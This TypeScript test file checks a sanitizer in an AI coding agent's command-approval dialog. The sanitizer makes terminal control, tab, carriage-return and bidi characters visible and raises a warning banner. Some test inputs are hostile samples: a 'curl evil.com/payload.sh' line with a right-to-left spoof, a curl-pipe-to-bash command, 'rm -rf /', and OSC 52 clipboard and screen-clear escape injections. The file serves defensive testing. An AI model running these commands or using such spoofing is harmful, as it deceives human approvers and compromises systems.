import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { visibleWidth } from "@earendil-works/pi-tui";
import approvalModeExtension, {
	wrapDialogLine,
	sanitizeUntrustedDetail,
} from "../extensions/approval-mode.ts";
import { sanitizeUntrustedDetail as sanitizeFromDetailSanitizer } from "../extensions/detail-sanitizer.ts";

// ============================================================================
// 1. sanitizeUntrustedDetail 单元测试
// ============================================================================

test("sanitizeUntrustedDetail 既可从 approval-mode 导入，也可从 detail-sanitizer 导入且完全一致", () => {
	assert.equal(typeof sanitizeUntrustedDetail, "function");
	assert.equal(typeof sanitizeFromDetailSanitizer, "function");
	assert.equal(sanitizeUntrustedDetail, sanitizeFromDetailSanitizer);
});

test("ESC (\\x1b / U+001B) 转义为 [ESC U+001B] 并破坏 CSI / OSC 注入", () => {
	// 单独 ESC
	const r1 = sanitizeUntrustedDetail("\x1b");
	assert.equal(r1.text, "[ESC U+001B]");
	assert.equal(r1.hasSanitized, true);
	assert.equal(r1.escapedControlCount, 1);
	assert.equal(r1.escapedTabCount, 0);
	assert.equal(r1.escapedBidiCount, 0);

	// CSI 清屏序列 \x1b[2J
	const r2 = sanitizeUntrustedDetail("\x1b[2J");
	assert.equal(r2.text, "[ESC U+001B][2J");
	assert.equal(r2.hasSanitized, true);
	assert.equal(r2.escapedControlCount, 1);

	// ANSI 颜色控制字符
	const r3 = sanitizeUntrustedDetail("\x1b[31;1mDanger\x1b[0m");
	assert.equal(r3.text, "[ESC U+001B][31;1mDanger[ESC U+001B][0m");
	assert.equal(r3.hasSanitized, true);
	assert.equal(r3.escapedControlCount, 2);

	// OSC 52 剪贴板写入注入
	const r4 = sanitizeUntrustedDetail("\x1b]52;c;c2VjcmV0\x07");
	assert.equal(r4.text, "[ESC U+001B]]52;c;c2VjcmV0[CTRL U+0007 BEL]");
	assert.equal(r4.hasSanitized, true);
	assert.equal(r4.escapedControlCount, 2); // 1 ESC + 1 BEL
});

test("制表符 Tab (\\t / U+0009) 转义为 [TAB U+0009] 捍卫宽度契约", () => {
	// 单个 Tab
	const r1 = sanitizeUntrustedDetail("\t");
	assert.equal(r1.text, "[TAB U+0009]");
	assert.equal(r1.hasSanitized, true);
	assert.equal(r1.escapedTabCount, 1);
	assert.equal(r1.escapedControlCount, 0);
	assert.equal(r1.escapedBidiCount, 0);

	// 多个 Tab 分隔字段
	const r2 = sanitizeUntrustedDetail("col1\tcol2\t\tcol3");
	assert.equal(r2.text, "col1[TAB U+0009]col2[TAB U+0009][TAB U+0009]col3");
	assert.equal(r2.escapedTabCount, 3);
	assert.equal(r2.escapedControlCount, 0);
	assert.equal(r2.hasSanitized, true);
});

test("回车符 CR (\\r / U+000D) 转义为 [CTRL U+000D CR] 阻止光标回移单行重绘覆盖", () => {
	const r1 = sanitizeUntrustedDetail("\r");
	assert.equal(r1.text, "[CTRL U+000D CR]");
	assert.equal(r1.hasSanitized, true);
	assert.equal(r1.escapedControlCount, 1);

	// 尝试利用 \r 重绘覆盖真实命令
	const r2 = sanitizeUntrustedDetail("rm -rf / # \r harmless");
	assert.equal(r2.text, "rm -rf / # [CTRL U+000D CR] harmless");
	assert.equal(r2.hasSanitized, true);
	assert.equal(r2.escapedControlCount, 1);
});

test("换行符 LF (\\n / U+000A) 原样保留，且 CRLF 中的 \\r 被转义而 \\n 保留", () => {
	// 单独换行符：原样保留，不触发清洗标记
	const r1 = sanitizeUntrustedDetail("\n");
	assert.equal(r1.text, "\n");
	assert.equal(r1.hasSanitized, false);
	assert.equal(r1.escapedControlCount, 0);
	assert.equal(r1.escapedTabCount, 0);
	assert.equal(r1.escapedBidiCount, 0);

	// 多行内容自带普通换行
	const r2 = sanitizeUntrustedDetail("echo line1\necho line2\necho line3");
	assert.equal(r2.text, "echo line1\necho line2\necho line3");
	assert.equal(r2.hasSanitized, false);

	// CRLF (\r\n)：\r 转义，\n 保留
	const r3 = sanitizeUntrustedDetail("first\r\nsecond");
	assert.equal(r3.text, "first[CTRL U+000D CR]\nsecond");
	assert.equal(r3.hasSanitized, true);
	assert.equal(r3.escapedControlCount, 1);
});

test("其他 C0 控制符 (0x00-0x1F) 转换为 [CTRL U+XXXX <NAME>]", () => {
	const cases: Array<[string, string, number]> = [
		["\x00", "[CTRL U+0000 NUL]", 0],
		["\x01", "[CTRL U+0001 SOH]", 1],
		["\x02", "[CTRL U+0002 STX]", 2],
		["\x03", "[CTRL U+0003 ETX]", 3],
		["\x04", "[CTRL U+0004 EOT]", 4],
		["\x05", "[CTRL U+0005 ENQ]", 5],
		["\x06", "[CTRL U+0006 ACK]", 6],
		["\x07", "[CTRL U+0007 BEL]", 7],
		["\x08", "[CTRL U+0008 BS]", 8],
		["\x0b", "[CTRL U+000B VT]", 11],
		["\x0c", "[CTRL U+000C FF]", 12],
		["\x0e", "[CTRL U+000E SO]", 14],
		["\x0f", "[CTRL U+000F SI]", 15],
		["\x10", "[CTRL U+0010 DLE]", 16],
		["\x1a", "[CTRL U+001A SUB]", 26],
		["\x1f", "[CTRL U+001F US]", 31],
	];

	for (const [char, expected] of cases) {
		const res = sanitizeUntrustedDetail(char);
		assert.equal(res.text, expected, `C0 控制符转义不符合规范: ${JSON.stringify(char)}`);
		assert.equal(res.hasSanitized, true);
		assert.equal(res.escapedControlCount, 1);
		assert.equal(res.escapedTabCount, 0);
		assert.equal(res.escapedBidiCount, 0);
	}
});

test("DEL 字符 (\\x7f / U+007F) 转义为 [DEL U+007F]", () => {
	const res = sanitizeUntrustedDetail("\x7f");
	assert.equal(res.text, "[DEL U+007F]");
	assert.equal(res.hasSanitized, true);
	assert.equal(res.escapedControlCount, 1);
});

test("C1 控制符 (0x80-0x9F) 转义为 [CTRL U+XXXX]", () => {
	const c1Cases: Array<[string, string]> = [
		["\u0080", "[CTRL U+0080]"],
		["\u0085", "[CTRL U+0085]"],
		["\u009b", "[CTRL U+009B]"], // 8-bit CSI
		["\u009d", "[CTRL U+009D]"], // 8-bit OSC
		["\u009f", "[CTRL U+009F]"],
	];

	for (const [char, expected] of c1Cases) {
		const res = sanitizeUntrustedDetail(char);
		assert.equal(res.text, expected, `C1 控制符转义不符合规范: ${JSON.stringify(char)}`);
		assert.equal(res.hasSanitized, true);
		assert.equal(res.escapedControlCount, 1);
	}
});

test("Bidi 覆盖与隔离字符转义为 [BIDI U+XXXX <NAME>] 防范排版颠倒欺骗", () => {
	const bidiCases: Array<[string, string]> = [
		["\u202E", "[BIDI U+202E RLO]"], // Right-to-Left Override
		["\u202A", "[BIDI U+202A LRE]"],
		["\u202B", "[BIDI U+202B RLE]"],
		["\u202C", "[BIDI U+202C PDF]"],
		["\u202D", "[BIDI U+202D LRO]"],
		["\u2066", "[BIDI U+2066 LRI]"],
		["\u2067", "[BIDI U+2067 RLI]"],
		["\u2068", "[BIDI U+2068 FSI]"],
		["\u2069", "[BIDI U+2069 PDI]"],
		["\u200E", "[BIDI U+200E LRM]"],
		["\u200F", "[BIDI U+200F RLM]"],
		["\u061C", "[BIDI U+061C ALM]"],
	];

	for (const [char, expected] of bidiCases) {
		const res = sanitizeUntrustedDetail(char);
		assert.equal(res.text, expected, `Bidi 字符转义不符合规范: ${JSON.stringify(char)}`);
		assert.equal(res.hasSanitized, true);
		assert.equal(res.escapedBidiCount, 1);
		assert.equal(res.escapedControlCount, 0);
		assert.equal(res.escapedTabCount, 0);
	}

	// 实际欺骗载荷测试：通过 RLO 伪装文件名后缀
	const spoofed = "curl evil.com/payload.sh # \u202Efd.hs";
	const resSpoofed = sanitizeUntrustedDetail(spoofed);
	assert.equal(resSpoofed.text, "curl evil.com/payload.sh # [BIDI U+202E RLO]fd.hs");
	assert.equal(resSpoofed.hasSanitized, true);
	assert.equal(resSpoofed.escapedBidiCount, 1);
});

test("纯净文本与合法多字节字符（中文字符、Emoji）完全保真不被误伤", () => {
	const cleanCmd = "git status -s && cargo build --release";
	const r1 = sanitizeUntrustedDetail(cleanCmd);
	assert.equal(r1.text, cleanCmd);
	assert.equal(r1.hasSanitized, false);
	assert.equal(r1.escapedControlCount, 0);
	assert.equal(r1.escapedTabCount, 0);
	assert.equal(r1.escapedBidiCount, 0);

	const cjkText = "准备执行命令：部署静态生产产物并刷新 CDN 缓存";
	const r2 = sanitizeUntrustedDetail(cjkText);
	assert.equal(r2.text, cjkText);
	assert.equal(r2.hasSanitized, false);

	const emojiText = "🚀 部署完成 🛡️ 安全合规 ✨";
	const r3 = sanitizeUntrustedDetail(emojiText);
	assert.equal(r3.text, emojiText);
	assert.equal(r3.hasSanitized, false);

	// 空字符串
	const r4 = sanitizeUntrustedDetail("");
	assert.equal(r4.text, "");
	assert.equal(r4.hasSanitized, false);
});

// ============================================================================
// 2. 与 wrapDialogLine 集成测试（视口宽度契约验证）
// ============================================================================

test("包含转义控制符的长字符串在窄视口下严格满足视口宽度契约", () => {
	// 混合多种特殊控制符的不可信输入
	const raw =
		"printf 'col1\tcol2\t\x1b[32mSUCCESS\x1b[0m\r\n\x1b[2J' && rm -rf \u202Etxt.sh && ls -la /tmp";
	const sanitized = sanitizeUntrustedDetail(raw);
	assert.equal(sanitized.hasSanitized, true);

	// 在 40、60、80 列视口下测试 wrapDialogLine
	const viewports = [40, 60, 80];
	for (const width of viewports) {
		const lines = wrapDialogLine(sanitized.text, width, "  ", "    ");
		assert.ok(lines.length > 1, `在宽度 ${width} 下应发生折行`);
		for (const line of lines) {
			const w = visibleWidth(line);
			assert.ok(w <= width, `行超出视口宽度限制(${w} > ${width}): ${JSON.stringify(line)}`);
		}
		// 验证没有残留未转义的 Tab 或 ESC 破坏宽度算术
		for (const line of lines) {
			assert.ok(!line.includes("\t"), "折行结果不应包含原始制表符 \\t");
			assert.ok(!line.includes("\x1b"), "折行结果不应包含原始 ESC 控制字符 \\x1b");
		}
	}
});

// ============================================================================
// 3. 端到端审批弹窗渲染与安全告警横幅测试
// ============================================================================

async function setupTuiApprovalEnv(defaultAction: string = "allow_once"): Promise<{
	handlers: Record<string, any>;
	commands: Record<string, any>;
	ctx: any;
	getRendered: () => any;
}> {
	const handlers: Record<string, any> = {};
	const commands: Record<string, any> = {};
	const pi = {
		registerFlag: () => {},
		registerCommand: (name: string, def: any) => {
			commands[name] = def;
		},
		registerShortcut: () => {},
		getActiveTools: () => ["bash", "edit", "write"],
		setActiveTools: () => {},
		on: (event: string, handler: Function) => {
			handlers[event] = handler;
		},
		appendEntry: () => {},
		getFlag: () => undefined,
	};
	approvalModeExtension(pi as any);

	const ctxModel = { provider: "ctx", id: "main" };
	const registry = {
		models: [ctxModel],
		find: () => null,
		getAll: () => [ctxModel] as any[],
		hasConfiguredAuth: () => true,
		complete: async () => ({ content: [{ type: "text", text: '{"shouldBlock": false}' }] }),
	};

	let rendered: any;
	const ctx: any = {
		modelRegistry: registry,
		model: ctxModel,
		mode: "tui",
		hasUI: true,
		ui: {
			notify: () => {},
			select: async () => null,
			theme: {
				fg: (_c: string, t: string) => t,
				bold: (t: string) => `*${t}*`,
			},
			setStatus: () => {},
			custom: async (factory: (tui: any, theme: any, kb: any, done: (r: any) => void) => any) => {
				const tui = { requestRender: () => {} };
				const theme = {
					fg: (_c: string, t: string) => t,
					bold: (t: string) => `*${t}*`,
				};
				rendered = factory(tui, theme, undefined, () => {});
				return defaultAction;
			},
		},
		cwd: mkdtempSync(join(tmpdir(), "pi-issue-0039-cwd-")),
		isProjectTrusted: () => true,
		sessionManager: { getBranch: () => [] },
	};

	await handlers["session_start"]({ reason: "start" }, ctx);
	await commands["approval-mode"].handler("manual", ctx); // manual 模式：bash 一律弹窗
	return { handlers, commands, ctx, getRendered: () => rendered };
}

test("纯净命令弹窗展示时不渲染安全告警横幅", async () => {
	const env = await setupTuiApprovalEnv();
	const cleanCmd = "npm test -- --filter=issue-0039";
	await env.handlers["tool_call"]({ toolName: "bash", input: { command: cleanCmd } }, env.ctx);

	const comp = env.getRendered();
	assert.ok(comp && typeof comp.render === "function", "应捕获到审批面板组件");

	const lines: string[] = comp.render(80);
	// 纯净命令不应包含安全警告横幅
	assert.ok(
		!lines.some((l) => l.includes("展示安全提醒")),
		"纯净命令不应显示特殊控制字符展示安全提醒横幅",
	);
	assert.ok(
		lines.some((l) => l.includes(cleanCmd)),
		"纯净命令应正常展示",
	);
});

test("包含控制字符时弹窗渲染醒目安全警告横幅并转义展示", async () => {
	const env = await setupTuiApprovalEnv();
	// 注入 4 处特殊字符：ESC (\x1b), Tab (\t), CR (\r), Bidi (\u202e)
	const maliciousCmd = "printf 'hello\x1b[2J\tworld\r\u202E'";
	await env.handlers["tool_call"]({ toolName: "bash", input: { command: maliciousCmd } }, env.ctx);

	const comp = env.getRendered();
	assert.ok(comp && typeof comp.render === "function", "应捕获到审批面板组件");

	// 1. 在宽视口（120列）下断言包含醒目的安全警告横幅且精确统计出 4 处特殊控制字符（单行无折断）
	const wideLines: string[] = comp.render(120);
	const warningBanner = wideLines.find((l) => l.includes("展示安全提醒"));
	assert.ok(warningBanner, "含控制字符的命令必须渲染安全警告横幅");
	assert.ok(
		warningBanner.includes("⚠️ 展示安全提醒：检测到 4 处特殊控制字符（已转义展示）。批准后将按原始参数执行。"),
		`警告横幅文案与统计不符: ${warningBanner}`,
	);

	// 2. 断言所有控制字符被可见转义展示
	assert.ok(wideLines.some((l) => l.includes("[ESC U+001B]")), "ESC 应转义为 [ESC U+001B]");
	assert.ok(wideLines.some((l) => l.includes("[TAB U+0009]")), "Tab 应转义为 [TAB U+0009]");
	assert.ok(wideLines.some((l) => l.includes("[CTRL U+000D CR]")), "CR 应转义为 [CTRL U+000D CR]");
	assert.ok(wideLines.some((l) => l.includes("[BIDI U+202E RLO]")), "Bidi 应转义为 [BIDI U+202E RLO]");

	// 3. 断言原始控制序列不再直接出现在渲染文本中
	assert.ok(!wideLines.some((l) => l.includes("\x1b[2J")), "原始清屏 ANSI 序列不应存在于渲染输出中");

	// 4. 在 80 列标准视口下断言警告横幅存在且满足视口契约
	const stdLines: string[] = comp.render(80);
	assert.ok(stdLines.some((l) => l.includes("展示安全提醒")), "80 列视口下应包含警告横幅");
	for (const l of stdLines) {
		assert.ok(visibleWidth(l) <= 80, `80列视口行超宽: ${l}`);
	}
});

test("窄视口 40 列下安全警告横幅与转义命令自适应换行且零溢出", async () => {
	const env = await setupTuiApprovalEnv();
	const cmd = "curl -s http://example.com/\tpayload.sh\x1b[2J | bash # \u202Eexe.sh";
	await env.handlers["tool_call"]({ toolName: "bash", input: { command: cmd } }, env.ctx);

	const comp = env.getRendered();
	const width = 40;
	const lines: string[] = comp.render(width);

	// 断言每行均严格满足视口限制
	for (const l of lines) {
		const w = visibleWidth(l);
		assert.ok(w <= width, `第 ${lines.indexOf(l) + 1} 行超宽(${w} > ${width}): ${JSON.stringify(l)}`);
	}

	// 安全告警横幅在 40 列窄视口下换行展示
	assert.ok(lines.some((l) => l.includes("展示安全提醒")), "窄视口下依然应有安全告警横幅");
});

test("安全边界硬约束——底层执行参数 (input.command) 必须保持原始未篡改", async () => {
	const env = await setupTuiApprovalEnv("allow_once");
	// 包含多种不可信控制字符的原始输入对象
	const rawCmd = "echo -e 'line1\x1b[31mRed\x1b[0m\tcolumn2\r\n\x7f' # \u202Esecret";
	const toolInput = { command: rawCmd };

	const result = await env.handlers["tool_call"](
		{ toolName: "bash", input: toolInput },
		env.ctx,
	);

	// 1. 批准执行：返回 undefined（代表允许底层工具执行）
	assert.equal(result, undefined, "allow_once 审批后应放行 tool_call 返回 undefined");

	// 2. 关键安全断言：传递给底层执行的 input.command 绝对未被修改或剥离
	assert.equal(
		toolInput.command,
		rawCmd,
		"底层执行参数 input.command 必须严格保持原始字节，不可被篡改或剥离！",
	);
});

test("多项详情 (details) 存在控制符时累加统计并全量清洗", async () => {
	const env = await setupTuiApprovalEnv();

	// 路径含有 Tab 和 ESC 的 edit 工具调用
	const editInput = {
		path: "src/\tconfig\x1b[2J.ts",
		edits: [{ oldText: "a", newText: "b" }],
	};

	await env.handlers["tool_call"]({ toolName: "edit", input: editInput }, env.ctx);
	const comp = env.getRendered();
	const lines: string[] = comp.render(160);

	// 路径中包含 1 个 Tab 和 1 个 ESC，共计 2 处
	assert.ok(lines.some((l) => l.includes("⚠️ 展示安全提醒：检测到 2 处特殊控制字符（已转义展示）。批准后将按原始参数执行。")));
	assert.ok(lines.some((l) => l.includes("[TAB U+0009]")));
	assert.ok(lines.some((l) => l.includes("[ESC U+001B]")));

	// 底层 input.path 保持原样
	assert.equal(editInput.path, "src/\tconfig\x1b[2J.ts");
});
